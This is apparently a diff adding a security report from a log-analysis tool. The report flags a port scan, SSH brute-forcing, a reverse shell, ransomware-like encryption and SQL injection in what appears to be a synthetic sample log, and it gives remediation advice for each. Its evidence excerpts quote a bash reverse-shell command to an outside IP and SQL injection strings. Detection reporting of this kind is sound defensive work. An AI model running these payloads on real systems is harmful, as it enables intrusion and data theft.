@@ -1,0 +1,80 @@
+=== Logix Report ===
+Analyzed at (UTC): 2025-09-18T15:22:02.747588Z
+Total lines processed: 13
+
+SUMMARY:
+Possible Port Scan (confidence 0.86)
+
+DETAILED FINDINGS:
+------------------------------------------------------------
+Name: Possible Port Scan
+Severity: 6
+Confidence: 0.86
+Count: 9
+Suggested Remediation:
+  - Block/investigate IP and monitor firewall logs.
+Immediate Precaution: Harden exposed services and use network segmentation.
+Evidence (excerpt):
+  185.23.45.67 targeted ports: [1, 23, 24, 25, 27, 30, 445, 446, 447]
+
+------------------------------------------------------------
+Name: Authentication Failures / Brute-force
+Severity: 8
+Confidence: 0.9
+Count: 3
+Suggested Remediation:
+  - Block offending IP(s). Enable MFA and account lockout.
+  - Reset targeted accounts and rotate credentials.
+Immediate Precaution: If confirmed, isolate host and check for backdoors.
+Evidence (excerpt):
+  line 2: 2025-09-14 11:01:24 WARNING Failed password for root from 185.23.45.67 port 445 ssh2
+  line 3: 2025-09-14 11:01:25 WARNING Failed password for root from 185.23.45.67 port 446 ssh2
+  line 4: 2025-09-14 11:01:27 WARNING Failed password for root from 185.23.45.67 port 447 ssh2
+
+------------------------------------------------------------
+Name: Command Injection / Reverse Shell
+Severity: 10
+Confidence: 0.9
+Count: 2
+Suggested Remediation:
+  - Disconnect host from network, collect memory image.
+  - Perform full incident response and root cause analysis.
+Immediate Precaution: Treat system as compromised until proven clean.
+Evidence (excerpt):
+  line 8: 2025-09-14 11:03:00 CRITICAL Reverse shell attempt detected: "/bin/bash -i >& /dev/tcp/185.23.45.90/4444 0>&1"
+  line 13: (repeat brute force + sql injection + reverse shell + ransomware keywords scattered across ~5000–6000 lines)
+
+------------------------------------------------------------
+Name: Ransomware-like activity
+Severity: 10
+Confidence: 0.9
+Count: 2
+Suggested Remediation:
+  - Disconnect host; restore from known-good backups.
+  - Contact IR team; do not pay ransom without legal counsel.
+Immediate Precaution: Preserve encrypted files for forensic analysis.
+Evidence (excerpt):
+  line 9: 2025-09-14 11:04:00 ALERT Ransomware activity: file encrypted C:\Users\john\Desktop\important.docx.locked
+  line 13: (repeat brute force + sql injection + reverse shell + ransomware keywords scattered across ~5000–6000 lines)
+
+------------------------------------------------------------
+Name: Possible SQL Injection
+Severity: 8
+Confidence: 0.79
+Count: 2
+Suggested Remediation:
+  - Sanitize inputs and use parameterized queries.
+  - Apply WAF rules and review DB logs.
+Immediate Precaution: Check database for suspicious queries and exports.
+Evidence (excerpt):
+  line 6: 2025-09-14 11:02:10 ERROR SQL Injection attempt: "UNION SELECT password FROM users WHERE '1'='1'"
+  line 7: 2025-09-14 11:02:15 ERROR Malicious input detected: "OR '1'='1' --"
+
+
+
+[No local user guide found]
+
+IMMEDIATE PRECAUTIONS:
+- If a compromise is suspected: disconnect the device from the network immediately.
+- Preserve evidence: do not reboot the host if possible; collect logs/images only by trained personnel.
+- Change passwords for affected accounts from a separate clean device.
